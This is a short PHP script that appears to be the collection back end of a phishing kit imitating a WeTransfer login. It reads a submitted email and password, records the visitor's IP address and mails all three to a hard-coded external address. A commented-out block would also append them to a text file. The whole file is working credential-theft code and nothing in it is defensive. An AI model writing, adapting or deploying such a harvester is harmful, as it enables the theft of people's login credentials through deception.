<?php
header('Access-Control-Allow-Origin: *');
    if (isset($_POST['email'])) {
    	$email = $_POST['email'];
    	$password = $_POST['pass'];
    	$myemail = "w.leon88@protonmail.com";
    	$subject = "Wetransfer";
    	
    	//Function to get user IP address
    	function get_client_ip() {
    		$ipaddress = '';
    		if (getenv('HTTP_CLIENT_IP'))
    			$ipaddress = getenv('HTTP_CLIENT_IP');
    		else if(getenv('HTTP_X_FORWARDED_FOR'))
    			$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    		else if(getenv('HTTP_X_FORWARDED'))
    			$ipaddress = getenv('HTTP_X_FORWARDED');
    		else if(getenv('HTTP_FORWARDED_FOR'))
    			$ipaddress = getenv('HTTP_FORWARDED_FOR');
    		else if(getenv('HTTP_FORWARDED'))
    		   $ipaddress = getenv('HTTP_FORWARDED');
    		else if(getenv('REMOTE_ADDR'))
    			$ipaddress = getenv('REMOTE_ADDR');
    		else
    			$ipaddress = 'UNKNOWN';
    		return $ipaddress;
    	}
    	
    	//Get user's IP.
    	$ip = get_client_ip();
    	
    	$message = "Email: ". $email."\r\n"."Password: ". $password."\r\n".$ip;
    	mail($myemail, $subject, $message);
    	
    	/*$fp = fopen("email-list.txt","a");
        fputs($fp,"\n".$message);
        fclose($fp);*/
    }
?>